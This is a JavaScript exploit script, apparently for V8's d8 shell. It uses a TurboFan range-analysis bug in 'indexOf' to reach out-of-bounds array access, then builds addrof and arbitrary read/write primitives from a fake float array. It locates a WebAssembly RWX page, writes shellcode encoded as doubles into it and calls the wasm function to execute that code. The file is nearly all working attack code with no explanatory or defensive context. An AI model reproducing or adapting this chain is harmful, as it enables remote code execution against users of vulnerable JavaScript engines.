let ab = new ArrayBuffer(8);
let f64a = new Float64Array(ab);
let u64a = new BigUint64Array(ab);

function f2i(v) {
    f64a[0] = v;
    return u64a[0];
}

function i2f(v) {
    u64a[0] = v;
    return f64a[0];
}

function hex(x) {
    if (x < 0) return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function gc() {
	for (let i = 0; i < 100; i++) {
		new ArrayBuffer(0x100000);
	}
}

function jit(val) {
    // force TurboFan
    try {} finally {}
    // Actual range [-1, int_max], compiler thinks [0, int_max]
    var i = 'ABCD'.indexOf(val);
    // Actual range [0, int_max], compiler thinks [1, int_max]
    i = i + 1;
    // Actual range [0, 4], compiler thinks [1, 4]
    i = Math.min(i, 4)
    // Actual range [0, 80], compiler thinks [20, 80]
    i = i * 20
    // Actual range [1, 81], compiler thinks [21, 81]
    i = i + 1
    
    var oob_arr = new Array(i)

    var victim = new Array(5)

    // address of fake float object (0x8282221)
    victim[0] = 6.76118486e-316

    var it = oob_arr[Symbol.iterator]()

    it.next()
    it.next()
    it.next()
    it.next()
    it.next()
    it.next()
    it.next() 

    return [oob_arr, victim, it.next().value]
}

function opt() {
    for(let i = 0; i < 0x2000; i++){
        jit('B');
    }
}

opt()

// Force allocation at constant address
gc()

var fake_float = [
    i2f(0x8203b09n), // Float map
    i2f(0x200000000n + 0x82826f5n), // Victim elements ptr address
    13.37
]

var result = jit('G');
var oob_arr = result[0];
var victim = result[1];
var fake_arr = result[2];

function addrof(obj) {
	victim[0] = obj
	return f2i(fake_arr[0]) & 0xffffffffn
}

function read(addr) {
    if (addr % 2n == 0) {
        addr += 1n
    }
    addr += (0x200000000n - 8n) 
    fake_float[1] = i2f(addr)
    return f2i(fake_arr[0])
}

function write(addr, val) {
    if (addr % 2n == 0) {
        addr += 1n
    }
    addr += (0x200000000n - 8n)
    fake_float[1] = i2f(addr)
    fake_arr[0] = val
}

var target = new ArrayBuffer(0x20);

function write_arr(addr, arr, target_addr) {
    write(target_addr + 0x1cn, i2f(addr));
    let float_buf = new Float64Array(target)
    for(let i = 0; i < arr.length; i++)
        float_buf[i] = arr[i]
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main

var addr_wasm = addrof(wasm_instance)
print("[*] wasm @ " + hex(addr_wasm));

target_addr = addrof(target);
print("[*] target @ " + hex(addrof(target)));

var addr_f = addrof(f)
print("[*] f @ " + hex(addr_f))

var addr_shellcode = read(addr_wasm + 0x60n)
print("[*] Shellcode @ " + hex(addr_shellcode))

let shellcode = [
    2.825563119134789e-71, 3.2060568105999132e-80,
    -2.5309726874116607e+35, 7.034840446283643e-309
]

write_arr(addr_shellcode, shellcode, target_addr)
print("[*] Shellcode write done!")

f()